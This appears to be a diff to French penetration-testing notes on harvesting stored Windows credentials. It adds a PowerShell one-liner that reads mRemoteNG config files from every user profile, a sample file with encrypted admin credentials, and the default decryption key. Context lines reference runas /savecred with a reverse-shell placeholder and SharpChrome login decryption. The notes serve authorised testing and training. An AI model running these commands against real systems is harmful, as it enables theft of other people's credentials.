@@ -31,7 +31,28 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 .\SharpChrome.exe logins /unprotect
 ```
 
-## Lazagne
+### mRemoteNG
+
+Les fichiers de configuration sont stockés dans  `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`
+
+```shell
+# Identification des fichiers de configuration d'mRemoteNG
+Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\APPDATA\Roaming\mRemoteNG\confCons.xml" -ErrorAction SilentlyContinue}
+```
+
+Les fichiers ont la forme suivante :
+
+```xml
+<?XML version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
+    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
+    ..SNIP..
+</Connections>
+```
+
+Les mots de passes sont stockés sous une forme chiffrée avec le mot de passe par défaut `mR3m`
+## Outils ciblant plusieures applicatifs
+### Lazagne
 
 Collecte de nombreux mots de passe stockés dans diverses endroits du système
 
